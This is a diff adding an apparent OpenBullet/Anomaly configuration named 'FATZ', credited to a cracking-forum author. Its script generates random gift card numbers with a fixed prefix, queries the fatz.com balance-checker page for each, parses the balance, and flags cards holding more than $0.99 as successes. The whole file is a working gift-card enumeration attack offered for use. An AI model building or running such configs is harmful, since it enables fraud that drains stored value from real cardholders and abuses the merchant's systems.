@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "FATZ",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-03T17:32:23.0705635-05:00",
+  "AdditionalInfo": "",
+  "Author": "SLAYA ON C.TO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "114400?d?d?d?d?d" -> CAP "Code" 
+
+REQUEST GET "https://fatz.com/balance-checker/?cn=<Code>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "BALANCE\" class=\"balance-btn\"><br><h3 id='cardvalue'>You have <b>$" "</b> remaining</h3><script>window.onload " CreateEmpty=FALSE -> CAP "BALANCE" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<BALANCE>" GreaterThan "0.99" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<BALANCE>" LessThan "1.00" 
+    KEY "<BALANCE>" GreaterThan "0.00" 
+  KEYCHAIN Failure OR 
+    KEY "<BALANCE>" Contains "0.00" 
+
